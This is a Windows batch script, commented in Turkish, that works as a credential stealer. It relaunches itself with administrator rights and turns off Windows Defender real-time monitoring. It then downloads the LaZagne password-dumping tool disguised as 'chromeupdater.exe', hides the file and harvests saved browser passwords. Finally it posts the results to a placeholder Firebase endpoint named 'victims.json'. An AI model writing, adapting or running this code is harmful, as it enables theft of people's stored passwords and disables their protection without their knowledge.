@echo off
:: Yönetici kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Yönetici yetkisi gerekiyor. Yeniden başlatılıyor...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [+] Defender real-time kapatılıyor...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

cd /d %TEMP%

echo [+] Lazagne indiriliyor...
curl -L -o chromeupdater.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe

attrib +h chromeupdater.exe

echo [+] Şifreler toplanıyor...
chromeupdater.exe browsers -oN -output results

echo [+] Firebase'e gönderiliyor...
setlocal EnableDelayedExpansion
set LOGFILE=results\browsers.txt
set DATA=

for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
    set "line=%%A"
    set "DATA=!DATA!!line!`n"
)

set FB=https://YOUR_FIREBASE_URL_HERE/victims.json

powershell -Command ^
  "$json = '{\"log\":@'\''%DATA%'\'@'}';" ^
  "Invoke-RestMethod -Uri '%FB%' -Method POST -Body $json -ContentType 'application/json'"

echo [+] Tamamlandı, çıkılıyor...
timeout /t 3 >nul
exit
